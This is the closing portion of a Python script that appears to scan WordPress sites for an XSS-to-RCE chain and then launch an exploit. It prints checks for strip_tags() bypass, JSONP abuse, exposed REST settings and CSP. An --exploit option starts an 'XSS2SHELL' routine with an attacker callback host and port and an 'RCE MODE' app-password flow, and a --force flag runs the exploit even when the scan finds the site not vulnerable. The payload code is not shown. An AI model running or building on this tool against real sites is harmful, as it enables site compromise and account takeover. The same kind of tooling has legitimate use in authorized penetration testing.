          f"{'✓' if results['error_message_reflection'] else '✗'}")

    esc = results.get('error_context', 'unknown')
    if results.get('html_escaping_active'):
        print(f"  HTML Escaping:           ⚠️ ACTIVE [{esc}]")
    elif results.get('html_escaping_active') is False:
        print(f"  HTML Escaping:           ✓ None (RAW HTML) [{esc}]")
    else:
        print(f"  HTML Escaping:           ? Undetermined [{esc}]")

    print(f"  strip_tags() Bypass:     "
          f"{'✓' if results['strip_tags_bypass'] else '✗'}")
    print(f"  user-profile.js:         "
          f"{'✓' if results['user_profile_js_loaded'] else '✗'}")
    print(f"  REST API:                "
          f"{'✓' if results['rest_api_accessible'] else '✗'}")
    print(f"  JSONP:                   "
          f"{'✓' if results['jsonp_works'] else '✗'}")
    print(f"  JSONP + _envelope:       "
          f"{'✓' if results['envelope_works'] else '✗'}")
    anon = results.get('anonymous_rest_exposed')
    anon_s = '⚠️ EXPOSED' if anon else ('✓' if anon is False else '?')
    print(f"  Anonymous REST Settings: {anon_s}")
    csp_b = results.get('csp_blocks_eval')
    csp_s = '✓ Blocks Eval' if csp_b else \
            ('✗ Permissive/None' if csp_b is False else '?')
    print(f"  CSP:                     {csp_s}")
    print(f"  Vulnerable:              "
          f"{'🔴 YES' if results['vulnerable'] else '🟢 No'}")
    print(f"  Chain Complete:          "
          f"{'🔴 YES' if results['chain_complete'] else '🟢 No'}")

    print(f"\n  Security Headers:")
    for h, v in results['security_headers'].items():
        if v['present']:
            print(f"    [+] {h}: {v['value'][:60]}")
        else:
            print(f"    [-] {h}: MISSING")

    if scanner.findings:
        print(f"\n{BOLD}FINDINGS ({len(scanner.findings)}):{W}")
        for i, f in enumerate(scanner.findings, 1):
            sev = f['type'].upper()
            print(f"  {i}. [{sev}] {f['test']}")
            print(f"     {f['detail']}")

    if results['vulnerable']:
        exit_code = EXIT_VULN

    # Exploit
    if args.exploit:
        if not results['vulnerable'] and not args.force:
            print(f"\n{BOLD}{'─'*60}{W}")
            print(f"{BOLD}XSS2SHELL EXPLOIT (PROOF-OF-CONCEPT){W}")
            print(f"{'─'*60}")
            log("Scanner Verdict: NOT VULNERABLE — Skipping Exploit.", 'warn')
            log("Re-run with --force to Attempt Anyway.", 'info')
        else:
            print(f"\n{BOLD}{'─'*60}{W}")
            mode_label = ('XSS PROOF MODE (ALERT)' if args.proof else
                          'RCE MODE (pwn.ai app-password flow)' if args.rce
                          else 'TELEMETRY MODE')
            print(f"{BOLD}XSS2SHELL EXPLOIT — {mode_label}{W}")
            print(f"{'─'*60}")
            exp = Exploit(base, callback_port=args.port,
                          callback_host=args.host,
                          timeout_wait=args.wait,
                          insecure=args.insecure,
                          proof_mode=args.proof,
                          rce_mode=args.rce)
            exp.no_pivot = args.no_pivot
            rc = exp.run()
            if rc is not None and rc != EXIT_ERROR:
                exit_code = max(exit_code, rc)

    sys.exit(exit_code)


if __name__ == '__main__':
    main()
